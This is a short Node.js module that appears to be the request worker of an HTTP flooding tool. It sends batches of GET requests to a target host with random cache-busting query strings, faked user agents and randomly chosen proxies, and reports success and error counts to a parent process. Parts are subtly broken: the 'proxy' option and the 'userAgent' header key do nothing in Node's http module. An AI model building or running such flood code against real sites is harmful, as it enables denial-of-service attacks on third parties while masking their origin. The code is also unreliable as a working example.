import http from 'http';
import crypto from "crypto";
import querystring from 'querystring';
import fakeUserAgent from 'fake-useragent';
import { DATA_MSG } from './constants.mjs';

function selectProxy(proxies) {
	const proxyIndex = Math.round(Math.random() * (proxies.length - 1));
	return proxies[proxyIndex];
}

export function request(host, path, port, userConfig, proxies) {
	const queryString = querystring.stringify({
		data: crypto.randomBytes(20).toString('hex')
	});

	const proxy = selectProxy(proxies);

	const options = {
		hostname: host,
		path: `${path}?${queryString}`,
		port,
		method: 'GET',
		headers: {
			Connection: 'keep-alive',
			userAgent: fakeUserAgent()
		},
		proxy: `http://${proxy.ip}:${proxy.port}`
	};

	/*if (proxies && proxies.length) {
		const proxy = selectProxy(proxies);
		options.proxy = `http://${proxy.ip}:${proxy.port}`;
	}*/

	const data = { host, port, path, requests: 0, errors: 0, success: 0, headers: [] };

	for (let i = 0; i < userConfig.requestPerBatch; ++i) {
		const req = http.request(options, res => {
			++data.requests;
			if (res.statusCode >= 200 && res.statusCode < 300) {
				++data.success;
			} else {
				++data.errors;
			}

			process.send({ cmd: DATA_MSG, data });
		});

		req.on('error', (e) => {
			++data.requests;
			++data.errors;
			process.send({ cmd: DATA_MSG, data });
		});

		req.end();
	}
}